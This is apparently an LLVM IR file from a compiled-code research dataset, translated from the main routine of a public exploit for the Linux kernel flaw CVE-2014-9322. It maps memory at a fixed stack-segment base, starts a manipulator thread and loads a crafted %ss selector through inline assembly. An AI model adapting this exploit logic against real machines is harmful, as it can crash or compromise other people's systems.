; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/dos/extr_36266.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/dos/extr_36266.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [40 x i8] c"[cve_2014_9322]: Preparing to exploit.\0A\00", align 1
@FALSE_SS_BASE = common dso_local global i64 0, align 8
@MAP_SIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [61 x i8] c"[cve_2014_9322 Error]: Unable to map memory at address: %lu\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"[cve_2014_9322]:  Panic!\0A\00", align 1
@segManipulatorThread = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [38 x i8] c"[cve_2014_9322 error]: pthread_create\00", align 1
@FLAG = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  store i32 0, i32* %1, align 4
  %4 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0))
  %5 = load i64, i64* @FALSE_SS_BASE, align 8
  %6 = inttoptr i64 %5 to i8*
  %7 = load i32, i32* @MAP_SIZE, align 4
  %8 = load i32, i32* @PROT_READ, align 4
  %9 = load i32, i32* @PROT_WRITE, align 4
  %10 = or i32 %8, %9
  %11 = load i32, i32* @MAP_FIXED, align 4
  %12 = load i32, i32* @MAP_ANON, align 4
  %13 = or i32 %11, %12
  %14 = load i32, i32* @MAP_PRIVATE, align 4
  %15 = or i32 %13, %14
  %16 = call i64 @mmap(i8* %6, i32 %7, i32 %10, i32 %15, i32 -1, i32 0)
  %17 = inttoptr i64 %16 to i32*
  store i32* %17, i32** %3, align 8
  %18 = load i32*, i32** %3, align 8
  %19 = load i64, i64* @FALSE_SS_BASE, align 8
  %20 = inttoptr i64 %19 to i32*
  %21 = icmp ne i32* %18, %20
  br i1 %21, label %22, label %26

22:                                               ; preds = %0
  %23 = load i32, i32* @stderr, align 4
  %24 = load i64, i64* @FALSE_SS_BASE, align 8
  %25 = call i32 @fprintf(i32 %23, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.1, i64 0, i64 0), i64 %24)
  store i32 -1, i32* %1, align 4
  br label %41

26:                                               ; preds = %0
  %27 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %28 = load i32, i32* @segManipulatorThread, align 4
  %29 = call i64 @pthread_create(i32* %2, i32* null, i32 %28, i32* null)
  %30 = icmp ne i64 %29, 0
  br i1 %30, label %31, label %33

31:                                               ; preds = %26
  %32 = call i32 @perror(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %41

33:                                               ; preds = %26
  %34 = call i32 @sleep(i32 1)
  call void asm sideeffect "mov $0, %ss;", "r,~{dirflag},~{fpsr},~{flags}"(i32 151) #2, !srcloc !2
  br label %35

35:                                               ; preds = %38, %33
  %36 = load i64, i64* @FLAG, align 8
  %37 = icmp eq i64 %36, 0
  br i1 %37, label %38, label %39

38:                                               ; preds = %35
  br label %35

39:                                               ; preds = %35
  %40 = call i32 @sleep(i32 4)
  store i32 0, i32* %1, align 4
  br label %41

41:                                               ; preds = %39, %31, %22
  %42 = load i32, i32* %1, align 4
  ret i32 %42
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, i64) #1

declare !callback !3 dso_local i64 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{i32 1210}
!3 = !{!4}
!4 = !{i64 2, i64 3, i1 false}
